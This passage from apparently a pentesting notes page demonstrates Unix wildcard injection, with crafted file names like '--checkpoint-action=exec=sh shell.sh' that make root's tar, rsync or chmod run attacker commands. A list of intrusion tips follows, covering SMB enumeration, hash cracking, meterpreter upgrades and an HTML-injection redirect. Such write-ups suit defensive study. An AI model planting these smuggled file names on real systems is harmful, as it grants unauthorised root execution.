</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 29 00:41 &ndash;reference=.drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</span></code></pre></td></tr></table></div></figure>
What happened? Instead of 000, all files are now set to mode 777 because of the &lsquo;&ndash;reference&rsquo; option supplied through file name.. Once again, file .drf.php owned by user &lsquo;leon&rsquo; with mode 777 was used as reference file and since &ndash;reference option is supplied, all files will be set to mode 777. Beside just &ndash;reference option, attacker can also create another file with
&lsquo;-R&rsquo; filename, to change file permissions on files in all subdirectories recursively. </li></p>

<p><li><strong>Tar arbitrary command execution</strong></p>

<p>Previous example is nice example of file ownership hijacking. Now, let&rsquo;s go to even more interesting stuff like arbitrary command execution. Tar is very common unix program
for creating and extracting archives.
Common usage for lets say creating archives is:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# tar cvvf archive.tar *</span></code></pre></td></tr></table></div></figure>
So, what&rsquo;s the problem with &lsquo;tar&rsquo;? Thing is that tar has many options, and among them, there some pretty interesting options from arbitrary parameter injection point of view.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Let&rsquo;s check tar manual page (man tar):
</span><span class='line'>
</span><span class='line'>      &ndash;checkpoint[=NUMBER]
</span><span class='line'>              display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>       &ndash;checkpoint-action=ACTION
</span><span class='line'>              execute ACTION on each checkpoint</span></code></pre></td></tr></table></div></figure>
There is &lsquo;&ndash;checkpoint-action&rsquo; option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.</p>

<p>Check the following directory:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:19 &ndash;checkpoint=1
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:17 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span></code></pre></td></tr></table></div></figure>
Now, for example, root user wants to create archive of all files in current directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# tar cf archive.tar *
</span><span class='line'>
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></code></pre></td></tr></table></div></figure>
Boom! What happened? /usr/bin/id command gets executed! We&rsquo;ve just achieved arbitrary command
execution under root privileges.
Once again, there are few files created by user &lsquo;leon&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:19 &ndash;checkpoint=1
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:17 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span></code></pre></td></tr></table></div></figure>
Options &lsquo;&ndash;checkpoint=1&rsquo; and &lsquo;&ndash;checkpoint-action=exec=sh shell.sh&rsquo; are passed to the &lsquo;tar&rsquo; program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell.sh
</span><span class='line'>/usr/bin/id</span></code></pre></td></tr></table></div></figure>
So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the &lsquo;root&rsquo; account above.
</li></p>

<p><li><strong>Rsync arbitrary command execution</strong></p>

<p>Rsync is &ldquo;a fast, versatile, remote (and local) file-copying tool&rdquo;, that is very common on Unix systems. If we check &lsquo;rsync&rsquo; manual page, we can again find options that can be abused for arbitrary command execution.</p>

<p>Rsync manual:
&ldquo;You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.&rdquo;</p>

<p>Interesting rsync option from manual:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> -e, &ndash;rsh=COMMAND           specify the remote shell to use
</span><span class='line'>     &ndash;rsync-path=PROGRAM    specify the rsync to run on remote machine</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s abuse one example directly from the &lsquo;rsync&rsquo; manual page. Following example will copy all C files in local directory to a remote host &lsquo;foo&rsquo; in &lsquo;/src&rsquo; directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># rsync -t <em>.c foo:src/</span></code></pre></td></tr></table></div></figure>
Directory content:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span></code></pre></td></tr></table></div></figure>
Now root will try to copy all C files to the remote server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# rsync -t </em>.c foo:src/
</span><span class='line'>
</span><span class='line'>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
</span><span class='line'>rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s see what happened&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 76
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 root root   101 Mar 28 04:49 shell_output.txt</span></code></pre></td></tr></table></div></figure>
There were two files owned by user &lsquo;leon&rsquo;, as listed below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span></code></pre></td></tr></table></div></figure>
After &lsquo;rsync&rsquo; execution, new file shell_output.txt whose owner is root is created in same directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 root root   101 Mar 28 04:49 shell_output.txt</span></code></pre></td></tr></table></div></figure>
If we check its content, following data is found.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell_output.txt
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></code></pre></td></tr></table></div></figure>
Trick is that because of the &lsquo;*.c&rsquo; wildcard, &lsquo;rsync&rsquo; got &lsquo;-e sh shell.c&rsquo; option on command line, and shell.c will be executed upon &lsquo;rsync&rsquo; start.
Content of shell.c is presented below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell.c
</span><span class='line'>/usr/bin/id &gt; shell_output.txt</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</ol></p>

<p><strong>Tips and Tricks:</strong>
<ol>
<li>run-parts: run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run-parts /etc/cron.daily</span></code></pre></td></tr></table></div></figure>
</li>
<li>Sudoers file:
if the sudoers file contains:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>secure_path
</span><span class='line'>Path used for every command run from sudo. If you don&rsquo;t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.
</span><span class='line'>
</span><span class='line'>env_reset
</span><span class='line'>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller&rsquo;s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
</span><span class='line'>
</span><span class='line'>mail_badpass
</span><span class='line'>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</span></code></pre></td></tr></table></div></figure></li>
<li>XSS/ HTML Injection:</p>

<p>The below will redirect the page to google.com
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;META http-equiv=&ldquo;refresh&rdquo; content=&ldquo;0;URL=<a href="http://www.google.com">http://www.google.com</a>&rdquo;&gt;</span></code></pre></td></tr></table></div></figure></li>
<li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password. </li>
<li>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)<a href="https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/">https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</a></li></p>

<p><li>Identification of OS:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/os-release
</span><span class='line'>
</span><span class='line'>NAME=&ldquo;Ubuntu&rdquo;
</span><span class='line'>VERSION=&ldquo;16.04 LTS (Xenial Xerus)&rdquo;
</span><span class='line'>ID=ubuntu
</span><span class='line'>ID_LIKE=debian
</span><span class='line'>PRETTY_NAME=&ldquo;Ubuntu 16.04 LTS&rdquo;
</span><span class='line'>VERSION_ID=&ldquo;16.04&rdquo;
</span><span class='line'>HOME_URL=&ldquo;<a href="http://www.ubuntu.com/">http://www.ubuntu.com/</a>&rdquo;
</span><span class='line'>SUPPORT_URL=&ldquo;<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>&rdquo;
</span><span class='line'>BUG_REPORT_URL=&ldquo;<a href="http://bugs.launchpad.net/ubuntu/">http://bugs.launchpad.net/ubuntu/</a>&rdquo;
</span><span class='line'>UBUNTU_CODENAME=xenial
</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>Java keystore file: <a href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores</a> and <a href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats</a></li>
<li>Cracking MD5 Hashes: Try <a href="https://crackstation.net/">https://crackstation.net/</a></li>
<li>Find files by wheel/ adm users.</li>
<li>Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if &ldquo;Policy of Truth&rdquo; is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist</li>
<li>When you see something like this &ldquo;Nick&rsquo;s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&rdquo;. Which says, only this can see me. Try to see what user-agent it is talking about.</p>

<p>The way it is implemented is by use of .htaccess file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .htaccess
</span><span class='line'>BrowserMatchNoCase &ldquo;iPhone&rdquo; allowed
</span><span class='line'>
</span><span class='line'>Order Deny,Allow
</span><span class='line'>Deny from ALL
</span><span class='line'>Allow from env=allowed
</span><span class='line'>ErrorDocument 403 &ldquo;&lt;H1&gt;Nick&rsquo;s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;&rdquo;</span></code></pre></td></tr></table></div></figure></li>
<li>Port 139 Open
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient -N -L 192.168.1.2
</span><span class='line'>WARNING: The &ldquo;syslog&rdquo; option is deprecated
</span><span class='line'>Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  &mdash;&mdash;&mdash;       &mdash;-      &mdash;&mdash;-
</span><span class='line'>  print$          Disk      Printer Drivers
</span><span class='line'>  kathy           Disk      Fred, What are we doing here?
</span><span class='line'>  tmp             Disk      All temporary files should be stored here
</span><span class='line'>  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
</span><span class='line'>Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  &mdash;&mdash;&mdash;            &mdash;&mdash;-
</span><span class='line'>  RED                  red server (Samba, Ubuntu)
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  &mdash;&mdash;&mdash;            &mdash;&mdash;-
</span><span class='line'>  WORKGROUP            RED
</span><span class='line'>
</span><span class='line'>-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password.
</span><span class='line'>-L|&ndash;list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don&rsquo;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.</span></code></pre></td></tr></table></div></figure>
If you want to access the share you might want to type:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient \\IP\share_name
</span><span class='line'>
</span><span class='line'>So, in the above example, it would be
</span><span class='line'>
</span><span class='line'>smbclient \\192.168.1.2\kathy</span></code></pre></td></tr></table></div></figure>
If port 139 is open, also run enum4linux, may be it would help get the user list
</li>
<li>
curl
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   -k, &ndash;insecure
</span><span class='line'>          (SSL) This option explicitly allows curl to perform &ldquo;insecure&rdquo; SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
</span><span class='line'>          This makes all connections considered &ldquo;insecure&rdquo; fail unless -k, &ndash;insecure is used.
</span><span class='line'>
</span><span class='line'>   -I, &ndash;head
</span><span class='line'>          (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size
</span><span class='line'>          and last modification time only.
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure></li>
<li>Port 69 UDP:
TFTP
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>get or put file</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>
Ruby Best way to get quoted words / phrases out of the text:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>text.scan(/&ldquo;([^&rdquo;]*)&ldquo;/)</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Convert all text in a file from UPPER to lowercase
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tr &lsquo;[:upper:]&rsquo; &lsquo;[:lower:]&rsquo; &lt; input.txt &gt; output.txt</span></code></pre></td></tr></table></div></figure>
Remove lines longer than x or shorter than x
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>awk &lsquo;length($0)&gt;x&rsquo; filename
</span><span class='line'>or
</span><span class='line'>awk &lsquo;length($0)&lt;x&rsquo; filename</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in Breach 2)), we can upgrade it to meterpreter by using sessions -u
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sessions -h
</span><span class='line'>Usage: sessions [options]
</span><span class='line'>
</span><span class='line'>Active session manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## Tighten security after security incident
</span><span class='line'>## root never gets to log in remotely
</span><span class='line'>PermitRootLogin no
</span><span class='line'>## Eugene &amp; Margo can SSH in, no-one else allowed
</span><span class='line'>AllowUsers eugene margo
</span><span class='line'>## SSH keys only but margo can use a password
</span><span class='line'>Match user margo
</span><span class='line'>    PasswordAuthentication yes
</span><span class='line'>## End tighten security</span></code></pre></td></tr></table></div></figure></li>
<li>Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</li>
<li>If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it&rsquo;s a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
